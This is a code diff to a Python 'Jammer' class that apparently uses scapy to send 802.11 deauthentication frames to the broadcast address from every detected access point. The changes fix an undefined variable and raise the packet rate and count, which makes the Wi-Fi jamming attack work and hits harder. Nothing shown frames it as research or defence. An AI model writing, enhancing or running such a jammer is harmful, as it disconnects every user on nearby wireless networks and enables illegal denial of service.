@@ -31,6 +31,7 @@ class Jammer:
                 else :
                     if oneCycle:
                         self.STOP_SNIFF = True
+                        print ("Stopping sniff flag")
                     else:
                         counterChannel = 1
             except KeyboardInterrupt:
@@ -82,12 +83,13 @@ class Jammer:
         return Process(target = self.perform_deauth, args=(target_accesspoint, 'FF:FF:FF:FF:FF:FF', deauth_pckt_count))
 
     def attackBSSID(self):
+        client = "FF:FF:FF:FF:FF:FF"
         while not self.ATTACK_STOP:
             try:
                 for bssid in self.NETWORKS:
                     print("Sending Deauth to %s from %s" % (client, bssid))
-                    pckt =  RadioTap() / Dot11(addr1='FF:FF:FF:FF:FF:FF', addr2=bssid, addr3=bssid) / Dot11Deauth()
-                    sendp(pckt, iface=self.INTERFACE, inter = .01, count=5)
+                    pckt =  RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
+                    sendp(pckt, iface=self.INTERFACE, inter=.0001, count=10)
             except KeyboardInterrupt:
                 self.ATTACK_STOP = True
 
